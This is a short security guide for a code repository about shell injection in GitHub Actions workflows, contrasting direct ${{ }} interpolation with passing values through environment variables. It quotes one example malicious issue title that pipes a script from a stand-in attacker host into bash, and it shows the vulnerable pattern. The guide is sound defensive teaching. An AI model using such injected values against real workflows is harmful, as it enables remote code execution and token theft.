---
title: "GitHub Actions Security Patterns"
read_when:
  - "writing or modifying GitHub Actions workflow files"
  - "passing dynamic values to shell commands in workflows"
  - "using user-controlled input in GitHub Actions run blocks"
tripwires:
  - action: "interpolating ${{ }} expressions directly into shell command arguments"
    warning: "Use environment variables instead. Direct interpolation allows shell injection. Read [GitHub Actions Security Patterns](ci/github-actions-security.md) first."
---

# GitHub Actions Security Patterns

## Code Injection via Direct Interpolation

When you use `${{ }}` in a `run:` block, GitHub Actions performs string substitution _before_ the shell executes. Special characters in the value can break out of quotes and execute arbitrary commands.

### Vulnerable Pattern

```yaml
- name: Create PR
  env:
    GH_TOKEN: ${{ github.token }}
  run: |
    gh pr create --title "${{ steps.issue.outputs.title }}"
```

A malicious issue title like `"; curl attacker.com/malicious.sh | bash #` would execute arbitrary commands.

### Safe Pattern

Pass user-controlled data through environment variables:

```yaml
- name: Create PR
  env:
    GH_TOKEN: ${{ github.token }}
    ISSUE_TITLE: ${{ steps.issue.outputs.title }}
  run: |
    gh pr create --title "$ISSUE_TITLE"
```

### Why This Works

1. GitHub sets the env var with the literal value
2. The shell reads `$ISSUE_TITLE` as a variable reference
3. The value is never parsed as shell syntax

## When This Applies

This pattern applies to:

- Issue titles, PR titles, branch names from user input
- Any data from GitHub API responses that originated from user input
- Webhook payloads with user-controlled fields

## Reference

- Fixed in: `.github/workflows/learn.yml` (commit 777e954dd)
- CodeQL rule: `actions/code-injection`
